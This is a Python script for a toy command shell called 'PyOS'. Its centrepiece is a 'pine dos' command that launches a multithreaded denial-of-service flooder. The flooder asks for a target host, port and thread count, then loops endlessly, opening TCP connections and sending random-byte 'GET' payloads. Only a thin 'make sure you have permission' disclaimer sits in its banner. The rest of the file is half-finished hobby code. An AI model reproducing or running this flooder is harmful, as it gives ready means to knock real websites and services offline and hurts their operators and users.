import os
import webbrowser
import requests
import sys
import time
import socket
import random

UpdateLog = "\nFixed DoS attack.\nAdded a ping command.\nFixed Root 'or' error.\nAdded '-h' and '-help' command.\nAdded an update log command."

from threading import Thread

def dos():
            # Needs Fixing #
            # if pkgdos == True:
            # Needs Fixing #
            class ConsoleColors:
                HEADER = '\033[95m'
                OKBLUE = '\033[94m'
                OKGREEN = '\033[92m'
                WARNING = '\033[93m'
                FAIL = '\033[91m'
                BOLD = '\033[1m'
                
            print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
             ____       ____      _____           _ 
            |  _ \  ___/ ___|    |_   _|__   ___ | |
            | | | |/ _ \___ \ _____| |/ _ \ / _ \| |
            | |_| | (_) |__) |_____| | (_) | (_) | |
            |____/ \___/____/      |_|\___/ \___/|_|
                    written by: depascaldc
                    for private USAGE ONLY
                    Make sure you have the
                    permission to attack the
                        given host
                        
            Source Code: https://github.com/depascaldc/DoS-Tool
                        
                ''')
                
            def getport():
                try:
                    p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
                    return p
                except ValueError:
                    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
                    return 80

            host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Host:\r\n")
            port = getport()
            speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
            threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))

            ip = socket.gethostbyname(host)

            bytesToSend = random._urandom(2450)

            i = 0;



            class Count:
                packetCounter = 0 

            def goForDosThatThing():
                try:
                    while True:
                        dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        try:
                            dosSocket.connect((ip, port))
                            for i in range(speedPerRun):
                                try:
                                    dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                                    dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                                    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
                                    Count.packetCounter = Count.packetCounter + 1
                                except socket.error:
                                    if ip.find == "localhost":
                                        print("Woops! Please use an IP address.")
                                    print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                                except KeyboardInterrupt:
                                    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
                        except socket.error:
                            print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
                        except KeyboardInterrupt:
                            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
                        dosSocket.close()
                except KeyboardInterrupt:
                    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
            try:
                    
                print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
            _   _   _             _      ____  _             _   _             
           / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
          / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
         / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
        /_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                        |___/ 
                    ''')
                print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
                time.sleep(1)
                print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25%")
                time.sleep(1)
                print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========          ] 50%")
                time.sleep(1)
                print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [===============     ] 75%")
                time.sleep(1)
                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
                
                for i in range(threads):
                    try:
                        t = Thread(target=goForDosThatThing)
                        t.start()
                    except KeyboardInterrupt:
                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
            except KeyboardInterrupt:
                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
                os.system(sys.executable + " main.py")

def ping():
    request = root.split("ping ")[1]
    print("")
    for i in range(10):
        start = time.time()
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((request, 80))
        end = time.time()
        print("Ping: " + str(end - start) + " seconds.")
        time.sleep(1)
    print("")
    os.system(sys.executable + " main.py")

# Install Test #

# Needs Fixing #
def install(DoS):
    print("Installed" + package + " successfully.")
    os.system(sys.executable + " main.py")
    pkgdos = True
# Needs Fixing #
    
# Install Test #

beta = False

while beta == True:
    # Needs Fixing #
    if open("cdlocal.txt", "r") == "":
        with open("cdlocal.txt", "w") as f:
            f.write("root")
    # Needs Fixing #

cdlocal = "root" # Broken #


print("")
root = input("root: ~ $ ")

# | Command Callers | #

# | DoS | #
if root == "pine dos":
    dos()

# | CD | #
if root.find("cd") != -1:
    print("\n Error: " + root + "\n \n Comment: CD Is currently not working. :(")
    os.system(sys.executable + " main.py")
    
    # Needs fixing #
    while beta == True:
        print("\n Running CD...\n ")
        with open("cdlocal.txt", "w") as f:
                f.write(root)
        time.sleep(.5)
        os.system(sys.executable + " Commands/CD/cd.py")
    # Needs fixing #
# | No Sudo | #
elif root.find("sudo") != -1:
    print("")
    print("""Error: 'sudo'

Comment: Sudo is not used in PyOS. Instead use 'pine'.""")
    os.system(sys.executable + " main.py")
# | Pine Install | #
if root.find("pine install") != -1:
    package = root.split("pine install")[1]
    if package == "" or package == " ":
        print("")
        print("Error: Package name not found.")
        os.system(sys.executable + " main.py")
        
    elif not package == "":
            print("")
            if package == " dos" or package == " DoS":
                install("DoS")
            else:
                print("\nError:" + package + " not found.")
                os.system(sys.executable + " main.py")

elif root == "py ripthatgit":
    os.system(sys.executable + " ripthatgit.py")
    
# | Pine Help | #
if root == "pine help":
    print("""
Pine Usage:
'pine install <package>' - Install a package.""")   
    os.system(sys.executable + " main.py")
    
# | CMD Not Found | #
if root == "pine":
    print("Pine usage: 'pine <command>' or 'pine help'")
    
# | Denial Of Service | #
if root == "pine ddos":
    print("\n Error: " + root + "\n Comment: Please use 'pine dos' instead.\n")

# | All Imports | #

# Needs Fixing #
while beta == True:
    if root == "py imports":
        print("Pip Install (Copy and paste in terminal to install):\n\npip install webbrowser\npip install requests\npip install system\npip install time\npip install socket\npip install random\npip install netfilterqueue\npip install scapy\npip install re\n")
# Needs Fixing #



# Needs Fixing #
while beta == True:
    while True:
            with open("cdlocal.txt", "w") as f:
                f.write(root)
# Needs Fixing #
    
if root.find("-i") != -1:
    if root.find("install"):
        print("\nError: " + root + " not found.\n\n Do you mean 'pine install'?")
        os.system(sys.executable + " main.py")
        
# | Ping | #
if root.find("ping") != -1:
    ping()
    
# | Help | #
if root == "-h" or root == "-help":
    print("All commands:\n\n pine <command>\n pine dos (Launches a DoS attack menu)\n py ripthatgit (Gets a topic and downloads all of the github projects with the same topic)\n pine install <package> (Install Packages)\n -h (Help)\n -help (Help)\n ping <ip> (Ping an IP Address.)\n '-ul' or '-updatelog' (Shows an update log)")
    os.system(sys.executable + " main.py")
    
# | Update Log | #
if root == "-updatelog" or root == "-ul":
    print(UpdateLog)
    os.system(sys.executable + " main.py")




# IF NOT FOUND #

# Needs Fixing #
while beta == True:
    #else:
        print("")
        print("Error: Command '" + root + "' not found.")
        os.system(sys.executable + " main.py")
# Needs Fixing #
